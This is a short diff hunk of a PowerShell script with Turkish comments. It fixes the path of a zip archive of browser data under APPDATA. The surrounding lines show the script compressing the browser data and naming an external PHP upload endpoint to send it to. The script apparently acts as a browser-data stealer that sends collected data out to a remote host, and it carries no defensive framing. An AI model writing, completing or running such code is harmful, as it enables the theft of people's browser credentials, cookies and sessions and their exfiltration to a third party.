@@ -64,7 +64,7 @@ Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
 Write-Host "Tarayıcı verileri '$zipFile' dosyası olarak sıkıştırıldı."
 
 # Yüklemek istediğiniz dosyanın yolu
-$filePath = "C:\%APPDATA%\BrowserData.zip"
+$filePath = "C:\%APPDATA%\BrowserData\BrowserData.zip"
 
 # PHP dosya yükleme URL'si
 $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
